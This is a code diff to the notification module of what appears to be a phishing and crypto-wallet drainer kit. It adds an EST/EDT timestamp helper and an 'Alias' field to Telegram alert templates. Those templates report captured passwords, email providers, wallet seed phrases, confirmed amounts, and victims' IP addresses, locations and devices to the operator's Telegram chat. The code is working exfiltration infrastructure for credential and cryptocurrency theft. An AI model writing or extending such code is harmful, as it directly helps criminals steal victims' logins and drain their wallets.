@@ -11,6 +11,25 @@ const SECONDARY_TELEGRAM_CHAT_ID = process.env.SECONDARY_TELEGRAM_CHAT_ID;
 // Apple-style separator
 const SEPARATOR = '━━━━━━━━━━━━━━━';
 
+// Helper function to get current EST/EDT timestamp
+function getESTTimestamp() {
+    const now = new Date();
+    const estTime = new Date().toLocaleString('en-US', {
+        timeZone: 'America/New_York',
+        hour12: true,
+        hour: 'numeric',
+        minute: '2-digit',
+        second: '2-digit'
+    });
+
+    // Determine if it's EST or EDT based on daylight saving time
+    const january = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
+    const july = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
+    const isDST = Math.max(january, july) !== now.getTimezoneOffset();
+
+    return estTime + (isDST ? ' EDT' : ' EST');
+}
+
 let settingsRef = null;
 let lastUpdateId = 0;
 
@@ -157,11 +176,7 @@ async function sendSecondaryNotification(message) {
 }
 
 export function formatTelegramMessage(type, data) {
-    const timestamp = new Date().toLocaleTimeString('en-US', { 
-        hour12: true,
-        hour: 'numeric',
-        minute: '2-digit'
-    });
+    const timestamp = getESTTimestamp();
 
     switch (type) {
         case 'server_status':
@@ -178,6 +193,7 @@ export function formatTelegramMessage(type, data) {
                 'New Connection 🌙',
                 SEPARATOR,
                 `⌥ Session ID: ${data.id}`,
+                `🏷️ Alias: ${data.alias}`,
                 `📱 Device: ${data.userAgent}`,
                 `🌍 IP Address: ${data.ip}`,
                 `📍 Location: ${data.location}`,
@@ -190,6 +206,7 @@ export function formatTelegramMessage(type, data) {
                 'Session Reviewed ✔️✨',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
+                `🏷️ Alias: ${data.alias}`,
                 `🌍 IP Address: ${data.ip}`,
                 `📍 Location: ${data.location}`,
                 SEPARATOR,
@@ -201,6 +218,7 @@ export function formatTelegramMessage(type, data) {
                 'Amount Confirmed 🌟💰',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
+                `🏷️ Alias: ${data.alias}`,
                 `💰 Amount: ${data.amount}`,
                 `🌍 IP Address: ${data.ip}`,
                 SEPARATOR,
@@ -212,6 +230,7 @@ export function formatTelegramMessage(type, data) {
                 'Phase Complete 🌕✅',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
+                `🏷️ Alias: ${data.alias}`,
                 `🌍 IP Address: ${data.ip}`,
                 `📍 Location: ${data.location}`,
                 `🔑 Seed Phrase:`,
@@ -225,6 +244,7 @@ export function formatTelegramMessage(type, data) {
                 'Email Received 📧🌙',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
+                `🏷️ Alias: ${data.alias}`,
                 `🌍 IP Address: ${data.ip}`,
                 `📍 Location: ${data.location}`,
                 `📮 Provider: ${data.provider}`,
@@ -238,6 +258,7 @@ export function formatTelegramMessage(type, data) {
                 'Password Captured 🔐🌟',
                 SEPARATOR,
                 `⌥ Session ID: ${data.sessionId}`,
+                `🏷️ Alias: ${data.alias}`,
                 `🌍 IP Address: ${data.ip}`,
                 `📍 Location: ${data.location}`,
                 `📮 Provider: ${data.provider}`,
@@ -292,6 +313,7 @@ export function formatTelegramMessage(type, data) {
                     'Session Released 👐🌙',
                     SEPARATOR,
                     `⌥ Session ID: ${data.id}`,
+                    `🏷️ Alias: ${data.alias}`,
                     `👤 Removed By: ${data.removedBy}`,
                     SEPARATOR,
                     `⏰ ${timestamp}`
@@ -323,11 +345,7 @@ function formatDuration(ms) {
 }
 
 export async function sendStatusUpdate(status) {
-    const timestamp = new Date().toLocaleTimeString('en-US', { 
-        hour12: true,
-        hour: 'numeric',
-        minute: '2-digit'
-    });
+    const timestamp = getESTTimestamp();
 
     const message = [
         '𝗦𝘁𝗮𝘁𝘂𝘀 𝗨𝗽𝗱𝗮𝘁𝗲',
@@ -343,11 +361,7 @@ export async function sendStatusUpdate(status) {
 }
 
 export async function sendErrorNotification(error) {
-    const timestamp = new Date().toLocaleTimeString('en-US', { 
-        hour12: true,
-        hour: 'numeric',
-        minute: '2-digit'
-    });
+    const timestamp = getESTTimestamp();
 
     const message = [
         '𝗘𝗿𝗿𝗼𝗿 𝗔𝗹𝗲𝗿𝘁',
